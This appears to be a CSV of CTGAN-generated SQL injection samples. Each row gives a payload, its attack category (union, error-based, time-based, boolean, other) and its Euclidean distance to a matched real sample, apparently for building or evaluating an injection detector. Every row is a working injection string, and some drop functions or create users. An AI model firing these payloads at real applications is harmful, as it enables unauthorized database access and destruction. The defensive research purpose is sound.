CTGAN_001782,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",nearest_attack_euclidean,R002100,4.544200886592656
CTGAN_001783,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R001898,4.257862044071875
CTGAN_001784,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R004772,2.7772089795953234
CTGAN_001785,attack,error,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",nearest_attack_euclidean,R004232,4.780943796990524
CTGAN_001786,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,4.962272737677745
CTGAN_001787,attack,union,"1'  )   union all select null,null,null,null--",nearest_attack_euclidean,R002395,4.37747721342854
CTGAN_001788,attack,other,1'||  (  select 'ozoj' where 1608  =  1608,nearest_attack_euclidean,R003615,1.8906558001338174
CTGAN_001789,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R003733,2.580144125218821
CTGAN_001790,attack,time,select sleep  (  5  )   and   (  1435  =  1435,nearest_attack_euclidean,R004659,1.9031512380336848
CTGAN_001791,attack,union,"-3747""  )   union all select 8962,8962,8962,8962,8962#",nearest_attack_euclidean,R008414,2.8350596112098927
CTGAN_001792,attack,union,"-3834'   )    )     )   union all select 8313,8313--",nearest_attack_euclidean,R003272,8.940693641530293
CTGAN_001793,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R003369,1.5532220104964019
CTGAN_001794,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",nearest_attack_euclidean,R005695,2.6473135095988707
CTGAN_001795,attack,union,"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R006935,11.348840949074763
CTGAN_001796,attack,boolean,"-2044%'   )    )    or elt  (  9299  =  3618,3618  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001450,5.979846145008571
CTGAN_001797,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R001009,3.1709596382636183
CTGAN_001798,attack,union,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",nearest_attack_euclidean,R008646,3.2348378246466996
CTGAN_001799,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,3.948942603857499
CTGAN_001800,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",nearest_attack_euclidean,R006850,4.361483755754815
CTGAN_001801,attack,error,1 where 5359  =  5359 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R007687,3.0250842960016304
CTGAN_001802,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R002961,3.9540853776717824
CTGAN_001803,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R006563,4.009853714158642
CTGAN_001804,attack,error,"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko",nearest_attack_euclidean,R008591,3.2159000496213954
CTGAN_001805,attack,error,"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R002660,4.987139556830641
CTGAN_001806,attack,union,"1"" where 1452  =  1452 union all select null,null,null,null--",nearest_attack_euclidean,R003768,6.114648134891571
CTGAN_001807,attack,error,"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008357,2.4119643583360952
CTGAN_001808,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,4.914614298478211
CTGAN_001809,attack,boolean,"-7518"" or elt  (  8413  =  3995,3995  )   and ""cpnf""  =  ""cpnf",nearest_attack_euclidean,R003689,2.7782413301643074
CTGAN_001810,attack,boolean,-8836%'  )   or 4856  =  3891,nearest_attack_euclidean,R005845,3.1121482082244785
CTGAN_001811,attack,error,"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R008195,3.977982216908679
CTGAN_001812,attack,union,"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",nearest_attack_euclidean,R006131,3.8240246781769875
CTGAN_001813,attack,error,-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,nearest_attack_euclidean,R008685,2.2263396841031744
CTGAN_001814,attack,other,select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008482,3.7621935019337713
CTGAN_001815,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,1.648321045062793
CTGAN_001816,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R007608,6.030565230717514
CTGAN_001817,attack,error,"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",nearest_attack_euclidean,R001313,6.603436743320485
CTGAN_001818,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R001291,6.580275775695362
CTGAN_001819,attack,error,"1   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  2230  =  2230",nearest_attack_euclidean,R001526,3.130600176658562
CTGAN_001820,attack,boolean,"1%""   )    )    and 7358  =  6986--",nearest_attack_euclidean,R006829,6.372826246014377
CTGAN_001821,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R005201,3.871673824786941
CTGAN_001822,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R005922,6.699364364362177
CTGAN_001823,attack,union,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",nearest_attack_euclidean,R004409,2.1571920681779058
CTGAN_001824,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R004839,4.050374379914476
CTGAN_001825,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001841,2.54361273698152
CTGAN_001826,attack,union,1'||  (  select 'owzs' where 1475  =  1475 union all select null--,nearest_attack_euclidean,R008189,8.990702126752623
CTGAN_001827,attack,other,select case when 7951  =  1147 then 1 else null end--,nearest_attack_euclidean,R002014,3.1906077589894757
CTGAN_001828,attack,time,1' where 4403  =  4403 rlike sleep  (  5  )  #,nearest_attack_euclidean,R007240,5.224021248009483
CTGAN_001829,attack,union,"-2204'||  (  select 'bwae' from dual where 4884  =  4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",nearest_attack_euclidean,R007480,8.424217023087703
CTGAN_001830,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R008218,3.9485609208458055
CTGAN_001831,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R008996,5.77625707895999
CTGAN_001832,attack,error,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R002749,6.758096175884256
CTGAN_001833,attack,boolean,"1'||  (  select 'osux' from dual where 7066  =  7066 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R005409,2.0324612307182743
CTGAN_001834,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R002961,2.7391407083443857
CTGAN_001835,attack,boolean,"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R002186,2.407431905522335
CTGAN_001836,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R001604,5.078005500964156
CTGAN_001837,attack,boolean,"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",nearest_attack_euclidean,R006626,4.786211133792663
CTGAN_001838,attack,union,"-1451%'  )   union all select 7666,7666,7666#",nearest_attack_euclidean,R007372,3.7314982637262117
CTGAN_001839,attack,boolean,"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R008893,4.634973799991411
CTGAN_001840,attack,other,1'||  (  select 'yuku' where 7480  =  7480,nearest_attack_euclidean,R002394,1.8728094676592306
CTGAN_001841,attack,time,"1%""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R008057,3.670196058406848
CTGAN_001842,attack,other,1'   )    )    as gfzb where 7904  =  7904,nearest_attack_euclidean,R002597,1.457901606930646
CTGAN_001843,attack,boolean,"1 and make_set  (  9542  =  8888,8888  )  -- idkn",nearest_attack_euclidean,R007212,4.272820590010755
CTGAN_001844,attack,boolean,or '1'  =  '1,nearest_attack_euclidean,R000253,3.81210811072235
CTGAN_001845,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,1.5286999270754613
CTGAN_001846,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000039,8.040279537652587
CTGAN_001847,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'bacm'  =  'bacm",nearest_attack_euclidean,R008758,2.888119751857349
CTGAN_001848,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R006342,3.3814370422418185
CTGAN_001849,attack,time,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'tpeo' like 'tpeo",nearest_attack_euclidean,R001955,6.061477865175273
CTGAN_001850,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,5.451120611642295
CTGAN_001851,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,3.7895267841878684
CTGAN_001852,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R005775,3.7491614613427706
CTGAN_001853,attack,union,"-3781  )   union all select 3916,3916,3916--",nearest_attack_euclidean,R005290,5.448950988503419
CTGAN_001854,attack,union,"1' in boolean mode  )   union all select null,null,null--",nearest_attack_euclidean,R002854,3.7938133209239058
CTGAN_001855,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R003384,5.896921727721345
CTGAN_001856,attack,boolean,1' in boolean mode  )   and 9198  =  9198--,nearest_attack_euclidean,R007127,2.521763680551773
CTGAN_001857,attack,other,if  (  4907  =  9581  )   select 4907 else drop function apqw--,nearest_attack_euclidean,R008010,2.428599582000644
CTGAN_001858,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R006797,6.115301457912089
CTGAN_001859,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,2.814205133102951
CTGAN_001860,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R002533,2.239459728125633
CTGAN_001861,attack,time,select sleep  (  5  )   and 'mlmu'  =  'mlmu,nearest_attack_euclidean,R008352,2.8117839944366247
CTGAN_001862,attack,other,if  (  7899  =  7899  )   select 7899 else drop function zbbp--,nearest_attack_euclidean,R003436,1.8291720296929412
CTGAN_001863,attack,time,"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R007545,3.9473923844038574
CTGAN_001864,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,2.8186281386182634
CTGAN_001865,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R008439,3.1466060074417954
CTGAN_001866,attack,time,1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001118,4.183253632883265
CTGAN_001867,attack,error,"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R005017,2.741416289474991
CTGAN_001868,attack,boolean,-5137  )   or 9323  =  9323#,nearest_attack_euclidean,R000863,4.8416853320489235
CTGAN_001869,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R004523,3.720768939253877
CTGAN_001870,attack,union,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",nearest_attack_euclidean,R005034,4.644873143884138
CTGAN_001871,attack,other,1  )   where 2232  =  2232,nearest_attack_euclidean,R001070,2.431603077638685
CTGAN_001872,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",nearest_attack_euclidean,R005396,2.930219235741897
CTGAN_001873,attack,union,"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",nearest_attack_euclidean,R007195,2.456663894911125
CTGAN_001874,attack,union,"1%'   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R003267,8.695885936509042
CTGAN_001875,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R005102,2.996808275790437
CTGAN_001876,attack,error,"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",nearest_attack_euclidean,R005834,5.092263009457228
CTGAN_001877,attack,error,"1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R004007,4.043218162842445
CTGAN_001878,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""tuhy"" like ""tuhy",nearest_attack_euclidean,R008377,4.350398036009592
CTGAN_001879,attack,other,1' where 8584  =  8584 order by 1#,nearest_attack_euclidean,R008437,3.4730539898174757
CTGAN_001880,attack,boolean,"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",nearest_attack_euclidean,R008998,4.96889312707425
CTGAN_001881,attack,error,"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk",nearest_attack_euclidean,R005221,4.925779881009477
CTGAN_001882,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R007332,3.0414706103663516
CTGAN_001883,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R005273,3.113988243840906
CTGAN_001884,attack,time,select sleep  (  5  ) ,nearest_attack_euclidean,R003000,2.140096933980158
CTGAN_001885,attack,other,end-- elvi,nearest_attack_euclidean,R006745,3.608406212263699
CTGAN_001886,attack,error,"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",nearest_attack_euclidean,R003115,2.928670556532496
CTGAN_001887,attack,other,create user name identified by 'pass123',nearest_attack_euclidean,R000651,2.5965155690067747
CTGAN_001888,attack,other, (  case when 5640  =  5640 then 5640 else null end  ) ,nearest_attack_euclidean,R008896,2.743651415266778
CTGAN_001889,attack,boolean,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R001220,2.7519666019570495
CTGAN_001890,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,nearest_attack_euclidean,R005838,2.708596975873798
CTGAN_001891,attack,boolean,"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R007335,2.484170403394929
CTGAN_001892,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,0.8136540598692946
CTGAN_001893,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R006685,3.7167583288256334
CTGAN_001894,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R005272,21.348496939794238
CTGAN_001895,attack,union,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",nearest_attack_euclidean,R005848,5.035381431266795
CTGAN_001896,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R005406,3.977743255045298
CTGAN_001897,attack,boolean,"1'||  (  select 'nbmo' from dual where 5572  =  5572 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R005618,7.21636320212605
CTGAN_001898,attack,other,end# ckxq,nearest_attack_euclidean,R003895,3.716408080585315
CTGAN_001899,attack,time,1 where 8180  =  8180 or sleep  (  5  )  #,nearest_attack_euclidean,R003052,1.608768338998418
CTGAN_001900,attack,time,1' where 4403  =  4403 rlike sleep  (  5  )  #,nearest_attack_euclidean,R007240,2.453910498721423
CTGAN_001901,attack,boolean,"1""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R006492,1.861886077712539
CTGAN_001902,attack,error,"1'  )   as jrwx where 6087  =  6087 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R007571,4.020497787080541
CTGAN_001903,attack,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R005004,4.976010315943053
CTGAN_001904,attack,boolean,1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,nearest_attack_euclidean,R007188,2.5793816142764636
CTGAN_001905,attack,error,"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R004300,8.705978617229166
CTGAN_001906,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,3.381838794610505
CTGAN_001907,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R002476,2.962113618837031
CTGAN_001908,attack,union,"1%"" union all select null,null,null,null,null--",nearest_attack_euclidean,R007624,3.44123504953954
CTGAN_001909,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.2600690237364967
CTGAN_001910,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R001569,5.185546299192878
CTGAN_001911,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",nearest_attack_euclidean,R003987,3.659935827981072
CTGAN_001912,attack,boolean,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000092,3.222763055949334
CTGAN_001913,attack,time,1 or sleep  (  5  )  -- nrzf,nearest_attack_euclidean,R007698,2.514260208049915
CTGAN_001914,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R006453,3.275695253209434
CTGAN_001915,attack,union,"1' union all select null,null,null,null,null--",nearest_attack_euclidean,R003494,3.2839996969613776
CTGAN_001916,attack,other,1   )    )    as gygm where 4024  =  4024,nearest_attack_euclidean,R001809,1.3031089723491798
CTGAN_001917,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R006453,5.38543850146177
CTGAN_001918,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R004111,5.4048624228319175
CTGAN_001919,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R004089,3.3104887632006794
CTGAN_001920,attack,error,"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R003730,4.354604946132414
CTGAN_001921,attack,union,"1""  )   as xwnu where 6490  =  6490 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R005957,2.2895024883217765
CTGAN_001922,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R002226,4.393811600013305
CTGAN_001923,attack,time,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,nearest_attack_euclidean,R001974,4.556082442407237
CTGAN_001924,attack,other,"make_set  (  2672  =  2672,5440  )  ",nearest_attack_euclidean,R002976,3.2990401727315195
CTGAN_001925,attack,union,"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",nearest_attack_euclidean,R003639,3.016439721625505
CTGAN_001926,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'ankn'  =  'ankn",nearest_attack_euclidean,R006245,4.082065730381119
CTGAN_001927,attack,boolean,"1  )   as wvpl where 9791  =  9791 and make_set  (  3491  =  9067,9067  )  --",nearest_attack_euclidean,R004338,2.340381269514728
CTGAN_001928,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000629,56.919971681771194
CTGAN_001929,attack,other,""" or """" """,nearest_attack_euclidean,R000286,7.222237396827134
